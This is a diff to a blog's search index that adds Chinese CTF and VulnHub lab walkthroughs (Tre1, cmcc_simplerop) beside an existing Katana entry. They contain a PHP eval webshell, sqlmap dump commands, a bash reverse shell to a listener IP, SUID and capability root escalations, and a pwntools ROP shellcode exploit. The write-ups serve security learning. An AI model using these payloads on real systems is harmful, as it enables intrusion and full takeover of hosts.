@@ -1,6 +1,17 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[Tre1 walkthrought]]></title>
+    <url>%2F2022%2F06%2F20%2FTre1_walkthrough%2F</url>
+    <content type="text"><![CDATA[前言这个靶机Web部分设计得非常real，提权部分几步走实现提权，主要考的信息收集。总体来说不错得一个靶机。 https://www.vulnhub.com/entry/tre-1,483/ 利用过程nmap开扫，发现开了ssh和80、8082两个端口得http服务。 80和8082端口同时用dirb开扫目录。8082端口除了index.html，并没有发现什么。 80端口下却有不少东西，根路径下数据库连接测试的页面和phpinfo页面。 1dirb http://192.168.189.137/ /usr/share/wordlists/dirb/big.txt -x /usr/share/wordlists/dirb/extensions_common.txt mantisbt目录下还有个漏洞报告的系统。 adminer.php页面尝试弱口令和Mysql客户端文件读取无果。 继续后面的mantisbt目录，发现mantisbt的子目录基本都能目录遍历，在config目录下找到了两个有用的文件：a.txt和data.sql，应该是作者留下了的线索。 a.txt里记录着数据库密码，刚好在adminer能派上用场。 data.sql文件里都是创建数据库的SQL语句，但里面有条插入到mantis_user_table表的操作就明显不寻常。password字段的MD5拿去cmd5匹配得出为root 用a.txt里获取到的数据库密码成功登录进了adminer，首先想到的是into outfile写webshell，然而没权限。 1select &apos;&lt;?php eval($_GET[cmd]);?&gt;&apos; into outfile &apos;/var/www/html/shell.php&apos;; 将password字段的MD5替换为root的MD5，登录进漏洞报告系统。 看见是比较新的版本，毕竟是漏洞报告系统，估计也没什么漏洞。 这时留意到用户表tre的realname不同寻常，看者有点像密码。试下ssh登录，果然就进去了。 上传privilege-escalation-awesome-scripts-suite的脚本收集信息，注意到/usr/bin/目录下的check-system可执行文件可写，并且root用户在运行这个命令。命令内容如下，死循环echo。。。 12345678DATE=`date '+%Y-%m-%d %H:%M:%S'`echo "Service started at $&#123;DATE&#125;" | systemd-cat -p infowhile :doecho "Checking...";sleep 1;done 一开始以为是在定时任务里用到这个命令，然而并没有，仔细找了找发现在/etc/systemd/system/里注册成了服务。 这个目录下的服务会开机启动，sudo -l刚好看见shutdown命令能免密码sudo。 开始想是反弹shell，结果没成功，于是用给find命令赋SUID属性的方提权。 1chmod u+s /usr/bin/find 用man看了下shutdown的使用方法，-r参数能够重启靶机，于是乎… 1sudo /sbin/shutdown -r 0 待重启完重新连上ssh后，find提权老操作。 1find . -exec /bin/bash -p \;]]></content>
+      <categories>
+        <category>靶机</category>
+      </categories>
+      <tags>
+        <tag>SUID</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[Katana walkthrought]]></title>
     <url>%2F2022%2F06%2F19%2FKatana_walkthough%2F</url>
     <content type="text"><![CDATA[前言武士刀这题作者自评为中级难度。确实，Web方面做着有点迷，提权方面又学到了个小trick。 https://www.vulnhub.com/entry/katana-1,482/ 利用过程照样nmap全端口扫描，开了ftp、ssh、samba和http服务。 1nmap -sV -p- -T 4 192.168.189.135 先去看看80端口的http服务，dirb扫到了个ebook目录，发现到处都是注入。 没waf直接上大杀器sqlmap，除了information_schema，还有个ebook库，里面有个admin表，记着管理员密码，其他没什么东西。 12sqlmap -u http://192.168.189.135/ebook/book.php?bookisbn=978-1-484217-26-9 --batch -D ebook --tablessqlmap -u http://192.168.189.135/ebook/book.php?bookisbn=978-1-484217-26-9 --batch -D ebook -T admin --dump 非DBA用户，sqlmap直接爆破出来管理员密码。 进到后台又添加书本功能，能上传图片，但实测不管是webshell还是正常图片，都没能成功上传。 后面看其他的端口，在8088端口发现了个upload页面。一开始用dirb什么也没扫出来，加了个-x参数扫后缀名就出来了。 1dirb http://192.168.189.135:8088/ /usr/share/wordlists/dirb/big.txt -x /usr/share/wordlists/dirb/extensions_common.txt 上传了一个webshell测试下，发现重命名移去一个新的目录。当前端口试了下都没找到上传的webshell，看下walkthough原来是在其他端口的http服务上。 在8715端口发现了上传的webshell，在这正确要验证授权，直接用sqlmap跑出来的管理员密码admin就行了。 一句话反弹了个shell。 1system('/bin/bash -c "bash -i &gt;&amp; /dev/tcp/192.168.189.129/4444 0&gt;&amp;1"'); 用privilege-escalation-awesome-scripts-suite收集信息，没看见有什么能利用的点。 瞄了下，用个新trick：Capilities特权操作属性，其中CAP_SETUID属性可通过python、perl提权，CAP_DAC_READ_SEARCH可通过tar提权。 用下面的命令搜索具有Capilities特权操作属性的文件。 1getcap -r / 2&gt;/dev/null python 设置uid，再弹个shell即可提权，命令如下： 1/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")']]></content>
@@ -77,6 +88,18 @@
         <tag>machineKey</tag>
         <tag>XSS</tag>
         <tag>SQL</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[[PWN]cmcc_simplerop]]></title>
+    <url>%2F2022%2F03%2F06%2FPWN-cmcc_simplerop%2F</url>
+    <content type="text"><![CDATA[cmcc_simplerop Writeup https://buuoj.cn/challenges#cmcc_simplerop IDA打开附件发现主程序就是简单的栈溢出。 并且是静态链接的程序，查找system函数不存在，但发现了mprotect函数。 mprotect(const void *start, size_t len, int prot)函数能改变一个内存区的保护属性，指定的内存区间必须包含整个内存页，我做到的题目页大小通常为1K。既若要改变bss的保护属性，bss的地址为0x80eaf80，则起始地址为0x80ea000，页大小为1000，权限为7表示可读可写可执行。 现在的思路是通过mprotect改变bss的保护属性，再通过read写入shellcode，跳转到bss处执行。 以下是exp。 1234567891011121314151617181920212223242526272829from pwn import *context.log_level = 'DEBUG'context.binary = './simplerop'if sys.argv[1] == 'l': p = process('./simplerop')else: p = remote('node3.buuoj.cn',28957)elf = ELF('./simplerop')bss = elf.bss()print(hex(bss))mprotect_sym = elf.sym['mprotect']read_sym = elf.sym['read']pop3 = 0x08048913payload = flat(cyclic(32),mprotect_sym,pop3,0x80ea000,0x1000,0x7,read_sym,pop3,0x0,bss+0x50,0x50,bss+0x50)p.recvuntil(':')# gdb.attach(p)p.send(payload)sleep(1)p.send(asm(shellcraft.sh()))p.interactive() 后话当我想要在第一个send前调试的时候，每次程序都异常退出。一开始还以为是payload有错，后来去到bss查看的时候发现shellcode并么有输入全。估计是由于调试程序，发送shellcode比read读取德要快，导致没有输入全，注释掉调试就没有异常退出了。]]></content>
+      <categories>
+        <category>PWN</category>
+      </categories>
+      <tags>
+        <tag>StackOverflow</tag>
+        <tag>mprotect</tag>
       </tags>
   </entry>
   <entry>
